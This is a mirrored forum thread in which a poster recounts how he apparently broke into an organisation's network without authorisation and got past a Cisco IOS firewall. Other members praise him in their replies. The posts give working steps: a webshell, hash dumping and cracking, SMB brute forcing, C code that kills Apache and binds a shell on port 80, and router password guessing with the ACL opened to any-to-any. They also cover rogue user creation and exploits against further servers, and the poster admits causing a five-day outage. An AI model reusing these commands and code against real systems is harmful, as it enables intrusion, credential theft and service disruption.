@@ -1,0 +1,591 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=558&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:41:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> Bypassing a Cisco IOS firewall</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreaddb38.html?t=558">Bypassing a Cisco IOS firewall</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread7d4e.html?t=558&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_top">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=558&amp;pp=10&amp;page=3" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="558" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 3</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 29">1</a></span><span><a href="printthread13f8.html?t=558&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 29">2</a></span><span><a href="printthread144d.html?t=558&amp;pp=10&amp;page=3" title="Show results 21 to 29 of 29">3</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread13f8.html?t=558&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 20 of 29"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread144d.html?t=558&amp;pp=10&amp;page=3" title="Last Page - Results 21 to 29 of 29">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:19 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+		<div class="title">Bypassing a Cisco IOS firewall</div>
+	
+	<div class="content">
+		<blockquote class="restore">This documentation is about a successful attack Strategy  on something which I was trying out form last 15 days. It all started with silent-poison handing over to me a webshell, &quot;a non interactive .php shell&quot; on a webserver the shell was having NT-Authority System privileges. He did a good work there, as I was told he used a joomal exploit to get that shell up running. And it was obviously a high priority webserver .He should probably document that part :).<br />
+<br />
+The issue he was facing was that he was not able to back connect nor use bind shell to get an interactive command prompt. Well yes it would be definitely be because of a proxy/Firewall/Nating issues. <br />
+<br />
+Day 1:<br />
+<br />
+All I am having is a web shell with privileges to execute commands, it was a windows 2008 serevr . I started by doing an external nmap <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">fb1h2s@bktrack:~#nmap -T4 -A targetip<br />
+<br />
+&quot;which will generate a full scan including tracert and&nbsp; script scans&quot;<br />
+<br />
+Out put was:<br />
+<br />
+TCp Port : 80 Open</code><hr />
+</div>No filtered ports  but just an open port,as normally if firewalled windows RPC ports would be filtered .Himm should be a Router ACL configured with no outbound connections and Only allow inbound connection on port 80<br />
+<br />
+For confirming I uploaded a command line port-scanner, not nmap as I am not having interactive command prompt and configuring namp+wincap on non interactive setup is hard so dint wanted to take that pain.  <br />
+<br />
+I uploded Found ScanLine v1.01 <a href="../external.html?link=http://www.foundstone.com/us/resources/proddesc/scanline.htm" target="_blank">http://www.foundstone.com/us/resourc...c/scanline.htm</a> and did banner garbing on the device which is doing the Nating<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">ipconfig &gt; found the device ip 192.168.0.1<br />
+<br />
+sl -vbt 192.168.0.1<br />
+<br />
+Starting scan against 192.168.0.1 port range: 1-5000<br />
+Total number of maximum threads is 20. Socket timeout is set to 20ms.<br />
+Port 1720 is open.<br />
+-- End of open TCP ports list.<br />
+<br />
+Cisco IOS firewall<br />
+<br />
+192.168.0.1<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+TCP ports: 23 80 1720</code><hr />
+</div><div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Before starting I dumped the admin/user hashes using <a href="../external.html?link=http://www.foofus.net/~fizzgig/fgdump/fgdump-usage.htm" target="_blank">http://www.foofus.net/~fizzgig/fgdump/fgdump-usage.htm</a>  and cracked online using <a href="../external.html?link=https://www.objectif-securite.ch/en/products.php" target="_blank">https://www.objectif-securite.ch/en/products.php</a><br />
+Which by the way was Admin@internal-ip-last-octet seems like I might have more chance for similar passwords :D<br />
+			
+		<hr />
+	</div>
+</div><br />
+So problem maker is a cisco Ios firewall . So I have to bypass this one to get an interactive shell Rdp,commd prompt etc.  And the question is how ??<br />
+<br />
+Day 2<br />
+<br />
+It took two days to build an option set<br />
+<br />
+[+]Few solutions I could think about was <br />
+[1]Get access to firewall by Brute-forcing password or some other means modify the acess list to.<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">access-list 101 permit tcp any host 171.16.23.1 eq 3389</code><hr />
+</div> [Hard?impossible form a non interactive shell ] And bruteforce program and all I ill have to code in native C/C++ which I wasn't that fast in doing [I am in love with python :)]<br />
+<br />
+[2] Find another system in the network which might have internet acess like Mail serevr Dns servers hack them then tunnel firewalled machines traffic and take it out to the internet and get interactive shell. <br />
+<br />
+[3] DNS tunneling and Port reuse <a href="../www.blackhat.com/presentations/bh-usa-08/Miller/BH_US_08_Ty_Miller_Reverse_DNS_Tunneling_Shellcode.pdf" target="_blank">http://www.blackhat.com/presentation..._Shellcode.pdf</a> Metsploit got DNs tunneling payloads. &quot;You cant achieve fully interactive shell&quot;<br />
+<br />
+And from these I choose the second option. So now I have to spot system with which might have direct internet access. <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">ipconfig /all Give me my Internal Dns server IP.<br />
+<br />
+192.168.0.4<br />
+&nbsp;I also did a Portscan on my subnet which gave me the Dns names too<br />
+&quot; Dns names changed&quot;<br />
+<br />
+192.168.0.4&nbsp; &nbsp;  <br />
+Hostname: INTERNALSERVER<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+<br />
+-------------------------------------------------------------------------------<br />
+<br />
+-------------------------------------------------------------------------------<br />
+192.168.0.17<br />
+Hostname: INTER2SERVER<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+<br />
+-------------------------------------------------------------------------------<br />
+192.168.0.18 <br />
+Hostname: ipcam-client<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+Starting scan against 192.168.0.18 port range: 1-5000<br />
+Total number of maximum threads is 50. Socket timeout is set to 3ms.<br />
+Port 22 is open.<br />
+Port 80 is open.<br />
+Port 443 is open.<br />
+Port 554 is open.<br />
+Port 2112 is open.<br />
+Port 3306 is open.<br />
+Port 4112 is open.<br />
+Port 4116 is open.<br />
+Port 4343 is open.<br />
+-- End of open TCP ports list.<br />
+<br />
+-------------------------------------------------------------------------------<br />
+192.168.0.246<br />
+Hostname: MYBOOKWORLD<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+<br />
+-------------------------------------------------------------------------------<br />
+<br />
+Scan finished at Thu Nov 25 15:34:20 2010<br />
+<br />
+&nbsp;--------------------------------------------------------------------------<br />
+192.168.0.18<br />
+Responded in 0 ms.<br />
+0 hops away<br />
+Responds with ICMP unreachable: No<br />
+TCP ports: 22 80 443 554 2112 3306 4112 4116 4343<br />
+<br />
+--------------------------------------------------------------------------<br />
+192.168.1.4<br />
+Hostname: exch.my.target.com<br />
+Responds with ICMP unreachable: No<br />
+192.168.1.4<br />
+Responded in 0 ms.<br />
+1 hop away<br />
+Responds with ICMP unreachable: No<br />
+TCP ports: 21 25 53 80 88 110 135 139 143 389 443 445 464 593 636 993 995 1025 1027 1038 1054 1058 1060 1066 1069 1107 1111 1123 1129 1163 1201 1219 1801 2101 2103 2105 2107 3171 3172 3173 3268 3269 3389</code><hr />
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:22 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Seems like I spotted what I wanted an Exchange mail server of target with Dns name exch.my.target.com<br />
+And another good news is there is quite a huge no of servers inside the network,<br />
+Including a Survilance Camera System and a I TB data server using &quot;MYBOOKWORLD&quot; <br />
+192.168.0.18 <br />
+Hostname: ipcam-client &quot;Lets come back to this later&quot;<br />
+<br />
+So now I knew the DNS name of there mail server , <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			till date I haven't seen an organization using 2 different Dns names for mail servers Internal and external so high possibility that we would be able to get the External IP address form this DNS name
+			
+		<hr />
+	</div>
+</div>. <br />
+<br />
+I typed on my browser the mail Domain name exch.mytarget.com and yuhu targets Microsoft Exchange webmail login poped opned :D. So now I have my target . Time to see if its fire-walled or not.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">Nmap -T4 -A IP</code><hr />
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:23 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><a href="../www.fb1h2s.com/laharti/emailserervscan.JPG" target="_blank">http://www.fb1h2s.com/laharti/emailserervscan.JPG</a><br />
+<br />
+Fiar enough so now this is would be the target to hack. A quick looking up also revealed that target mail server was also there Domain controller :D how stupid is that. And what the point in putting a firewall in front off web server and not doing anything to this Mail/Domain server, Sad but good for me.<br />
+<br />
+Nmaps Smb bruter module gives good results. So that if I could crack an account then I could use it to excute commands using Pstools<br />
+<a href="../external.html?link=http://technet.microsoft.com/en-us/sysinternals/bb896649.aspx" target="_blank">http://technet.microsoft.com/en-us/s.../bb896649.aspx</a>  <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">psexec&nbsp; -u user -p password \\marklap command</code><hr />
+</div>So did an nmap smbruter and  Good news was got two successful logins <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">nmap --script smb-brute.nse -p445</code><hr />
+</div><a href="../www.fb1h2s.com/laharti/smbbruter.JPG" target="_blank">http://www.fb1h2s.com/laharti/smbbruter.JPG</a><br />
+ <br />
+And bad news was that none of the users were privileged enough to get command execution :(. <br />
+<br />
+I did little more pocking around with the mail server found out the snmb community string was public only used Snmpenum, listed updates and checked if any was missiing, that too dint worked.<br />
+<a href="../farm6.static.flickr.com/5217/5493264383_654664b92c_z.jpg" target="_blank">http://farm6.static.flickr.com/5217/...4664b92c_z.jpg</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:24 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Trying to compromise it  dint succeed. And got exhausted. See my motive is to attain Interactive shell on that webserver. So I din't spend more time with the mail server and started thinking about a different one. <br />
+<br />
+[+] Plan 1,2,3 flopped for me so need to make a new plan <br />
+[-] Curent scenario is the Nating is taking place in the Cisco firewall where connections are forwarded to internal Ip and Cisco ACL is configured in such a way that.<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">access-list 101 permit tcp any host 171.16.23.1 eq 80<br />
+--&gt; allows connection on port 80 <br />
+access-list 101 deny tcp any host 171.16.23.1 eq any<br />
+--&gt; deny any other connections on any other port</code><hr />
+</div>You could read a good doc abt ACLs here <a href="../external.html?link=http://www.cisco.com/en/US/tech/tk648/tk361/technologies_configuration_example09186a0080100548.shtml" target="_blank">http://www.cisco.com/en/US/tech/tk64...80100548.shtml</a><br />
+<br />
+[-]So connections to port 80 would be accepted and forwarded to internal computer. As the Webserevr running Apache is using port 80 we cant bind a port on the 'inused' port .<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			 Some were I have read a used port reuse methodology , <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			dint get it though
+			
+		<hr />
+	</div>
+</div>
+			
+		<hr />
+	</div>
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:24 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Solution </b><br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Stupid Most Idea
+			
+		<hr />
+	</div>
+</div>We cant use  port 80 as its been used by apache but if we could shut down apache and make a Command bind shell on port 80 then we could simply telnet to the server and get an interactive command prompt, firewall wont even say a word :cool:. <br />
+<br />
+Well my idea was dump but if that would satisfy my needs then that would be all enough. <br />
+<br />
+<b>Setting up the plan</b><br />
+1)  Make a bind shell using metsploit bind to internal machines Ip on port 80<br />
+2) Make another program which will kill http and call our bind shell and loop through the process so that we wont loose control over web shell.<br />
+3) Make sure that my plan is working fine, by testing/verifying it on local machine. If anything goes wrong then we will end up with nothing.<br />
+4) And also excute the plan only at midnight when no traffice to that web server is there, verify that with netsta -a and do accordingly <br />
+<br />
+[+] A small code to do stuff was built <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">//winexec.c<br />
+///stupid code by fb1h2s<br />
+//well not leet but idea works :D<br />
+#include&lt;windows.h&gt;<br />
+#include&lt;time.h&gt;<br />
+int main(int argc, char** argv)<br />
+{<br />
+int running =1;<br />
+<br />
+while(1 ==1)<br />
+{<br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  <br />
+system(&quot;taskkill /IM httpd.exe /F&quot;);&nbsp; // kill http&nbsp; &nbsp; &nbsp; <br />
+WinExec(&quot;bind.exe&quot;, SW_SHOWNORMAL); // call windows bind shell port 80 <br />
+Sleep(250000);&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // lets hang out with intractive command prompt for 4 mins //and try&nbsp; to compromise firewall<br />
+system(&quot;taskkill /IM bind.exe /F&quot;);&nbsp; // kill bind shell<br />
+WinExec(&quot;C:\\pathonwebserver\\apache\\bin\\httpd.exe&quot;, SW_SHOWNORMAL);<br />
+//bring back http server my work is done and let continue after some time<br />
+Sleep(150000);<br />
+}<br />
+<br />
+}</code><hr />
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:25 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Once code was built I tested on my local system, all these with the assumption that a CBAC Context based acesslist is in use <a href="../external.html?link=http://www.cisco.com/en/US/docs/ios/11_3/feature/guide/firewall.html#wp8216" target="_blank">http://www.cisco.com/en/US/docs/ios/...ll.html#wp8216</a> is created normally its CABC only.<br />
+and everything worked fine. <br />
+<br />
+Uploaded Bind shell and uploaded winexec.exe binary and all in place. I executed <br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">winexec.exe</code><hr />
+</div>Boom Apache went down as planned so as the webshell , now I tried to telnet to port 80 of target , screwed noting works, not getting any Command prompt back, waited for 5 mins to get back my http server, that too dint work, Screwed royally :rolleyes:<br />
+<br />
+Its only after that I understood my stupidity<br />
+1) winexec.exe is called form command line via php--&gt; cmd.exe /winexec.exe<br />
+2)When winexec.exe excutes it kills appache there by php and ends calling terminal cmd.exe<br />
+3) so no calls to bind.exe is made :(<br />
+4) when I tested on my local machine I only tested it by running the codes manually dint call it form webshell.<br />
+<br />
+I could have planned and taught a little more.All I needed to do was make another program &quot;callwinexec.exe&quot; which called winexec.exe and run &quot;callwinexec.exe&quot; from webshell  <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			And not doing thats consequences was that the webserver was down for 5 days . And I waited anxiously checking  every day whether the site was back up or not.
+			
+		<hr />
+	</div>
+</div>So back on 9th day server was up again. <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Irresponsible admins why would they need 5 days to restart apache
+			
+		<hr />
+	</div>
+</div></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_7">
+	<div class="header">
+		<div class="datetime">12-11-2010, 03:25 AM</div>
+		<span class="username">fb1h2s</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><b>Now the time for real woot woot </b>, <br />
+Uploaded programs to server and triggered callwinexec.exe<br />
+<br />
+Result was:<br />
+<a href="../farm6.static.flickr.com/5136/5493260717_b4c1e118a7_z.jpg" target="_blank">http://farm6.static.flickr.com/5136/...c1e118a7_z.jpg</a><br />
+<br />
+So command prompt is achieved, and a quick bruteforce on the routers telnet was done remember I have mentioned the admin password of the webserver was Admin@ip-adress-last-octect so same stuff worked on the router to. That was quick :D.  And I modified acesslist enabled any to any on the router. I used the <a href="../external.html?link=http://www.cisco.com/en/US/tech/tk648/tk361/technologies_configuration_example09186a0080100548.shtml" target="_blank">http://www.cisco.com/en/US/tech/tk64...80100548.shtml</a><br />
+<br />
+And used google to do most of the stuffs.<br />
+<br />
+So any to any acess is granted and rdp also was available.<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			 I had issues with logging in, as the webadmin had left a rdp session unclosed so had to use this tutorial to get past it <a href="../external.html?link=http://retrohack.com/killing-rdp-sessions-at-the-cmd-line/" target="_blank">http://retrohack.com/killing-rdp-ses...-the-cmd-line/</a>
+			
+		<hr />
+	</div>
+</div> And I did another stupid thing that was installing python for further exploitations. which was discovered by admin the next day and took down server for maintenance for one day and changed the admin password also he made the NT+LM hashes unavailable, but dint figure out the router thing.<br />
+<br />
+So next day night I had to get a bind shell back and as I dint know the password and only NT hashes were available I had to use<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<hr /><code class="bbcode_code">net user user new password<br />
+net user /add</code><hr />
+</div>tricks <br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			 which still work on windows server 2008
+			
+		<hr />
+	</div>
+</div>to get a new user and used Remote Desktop to to connect to it. MY  aim was already complected but my curiosity of seeing the rest of the servers in the network made me install Nessus and Nmap on tht serevr.<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Nessue 4 will have issues with flash via rdp , as you need to install a stand alone version of flash for IE to acess flash via RDP 
+			
+		<hr />
+	</div>
+</div><a href="../farm6.static.flickr.com/5013/5493260863_998c14928f_z.jpg" target="_blank">http://farm6.static.flickr.com/5013/...8c14928f_z.jpg</a><br />
+ As I already had made the list of alive IPs using foundstone scan line on the very first days itself, segregated the Ips list and passed them to nessus and nmap.<br />
+<br />
+<b>16th Day that was yesterday</b><br />
+Owned 4 more servers inside using three different exploits.<br />
+I am not going in detail about those stuffs coz am tired writing + you could google about them. Or will detail abt Jboss exploit in some other article.<br />
+1) ms08-067 used a public version of the code<br />
+2) Jboss console was there on another win 2008 server 0wned that too.<br />
+<a href="../external.html?link=https://issues.jboss.org/browse/ASPATCH-126?page=com.atlassian.jira.plugin.system.issuetabpanels%3Achangehistory-tabpanelhttps://issues.jboss.org/browse/ASPATCH-126?page=com.atlassian.jira.plugin.system.issuetabpanels%3Achangehistory-tabpanel" target="_blank">https://issues.jboss.org/browse/ASPA...story-tabpanel</a><br />
+3) Microsoft Windows SMB Shares Unprivileged Access<br />
+4)Password brute fore Admin@ip worked on another machine too.<br />
+<a href="../farm6.static.flickr.com/5260/5493858306_3ac7a8179a_z.jpg" target="_blank">http://farm6.static.flickr.com/5260/...c7a8179a_z.jpg</a><br />
+<br />
+I was hacking like a mad ass for the last 15 days. Though my primary target inside was a CISCO VOSM surveillance camera management server, I could not reach there. It was a linux machine and am not that good remotely exploiting linux.<br />
+<br />
+ And today I got a confirmation form Null Con folks confirming that my paper on &quot;Penetration testing Biometric system &quot; was selected so had to work on that and wont be able to continue with this one . So just taught of documenting the work so it will save some one Else's time in places where I lagged. <br />
+<br />
+And am thanking all the good fellow hackers of Garage4hackers and others whom I bugged these days asking my doubts, who all helped me out in circumstances  .<br />
+B0nd,Eberly,wipu,webd3vil,sagar.belure,vinnu and <br />
+greetz to garage members : silenpoison(special one for starting it), w4ri0r,empty,neo,Rohith,Sids786,d4rkest,SmartKD,Ti  a,h@xor,Atul,prasant,micro,nishant. <br />
+And obviously to my sweet girl friend who calls me busy geek and knows that am not a good BF, but still loves me .<br />
+<br />
+I always add this greetz part to wht ever I post :)<br />
+<br />
+<b>PDF Version Attached:</b></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_8">
+	<div class="header">
+		<div class="datetime">12-11-2010, 05:58 AM</div>
+		<span class="username">b0nd</span>
+	</div>
+	
+	
+		<div class="title">U r a monster !!!</div>
+	
+	<div class="content">
+		<blockquote class="restore">Yeah fb. Couple of days back empty told me about your idea of stopping the web server and running own code as only web port was allowed through firewall. That part I found deadly!!!<br />
+<br />
+You fall under the category of &quot;determined hackers&quot; and it is just next to impossible to stop such brains :)</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_9">
+	<div class="header">
+		<div class="datetime">12-11-2010, 10:47 AM</div>
+		<span class="username">D4rk357</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">EPIC .....  this topic is bookmarked for reference ... One of the most epic post in garage</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_10">
+	<div class="header">
+		<div class="datetime">12-11-2010, 11:07 AM</div>
+		<span class="username">prashant_uniyal</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Mind-blowing :)..really, fb1h2s is a &quot;determined hacker&quot; ;)</blockquote>
+	</div>
+</li>
+</ul>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread7d4e.html?t=558&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_bottom">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=558&amp;pp=10&amp;page=3" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="558" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 3</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 29">1</a></span><span><a href="printthread13f8.html?t=558&amp;pp=10&amp;page=2" title="Show results 11 to 20 of 29">2</a></span><span><a href="printthread144d.html?t=558&amp;pp=10&amp;page=3" title="Show results 21 to 29 of 29">3</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread13f8.html?t=558&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 20 of 29"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread144d.html?t=558&amp;pp=10&amp;page=3" title="Last Page - Results 21 to 29 of 29">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:44 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=558&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 17:41:05 GMT -->
+</html>
